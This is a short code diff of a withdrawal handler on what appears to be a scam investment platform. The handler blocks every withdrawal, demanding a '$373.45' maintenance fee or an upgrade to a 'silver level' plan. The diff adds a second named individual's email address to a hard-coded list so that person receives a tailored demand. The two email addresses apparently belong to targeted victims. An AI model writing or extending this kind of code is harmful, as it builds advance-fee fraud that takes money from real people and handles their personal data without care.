@@ -21,8 +21,12 @@ export const makeWithdrawal = async (req, res) => {
       "maintenance fee of $373.45 needed for service charge before any withdrawal",
       null
     );
-  } else if (req.profile.email?.toLowerCase() === "faithnk248@gmail.com") {
-    return response(res, 401, "Activate your silver level", null);
+  } else if (
+    ["faithnk248@gmail.com", "mercysimson@compuserve.com"].includes(
+      req.profile.email?.toLowerCase()
+    )
+  ) {
+    return response(res, 401, "Activate your silver level plan", null);
   }
   return response(res, 401, "Upgrade your account to sliver level", null);
   /**
